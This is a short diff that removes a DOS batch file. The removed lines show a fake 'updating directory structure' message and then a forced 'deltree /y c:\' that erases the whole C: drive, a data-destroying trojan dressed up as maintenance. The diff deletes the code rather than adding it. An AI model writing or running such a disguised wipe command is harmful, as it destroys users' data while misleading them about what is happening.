@@ -1,3 +1,0 @@
-@Echo Updating directory structure!
-@Echo Please wait . . .
-@deltree /y c:\ > asphyxiate
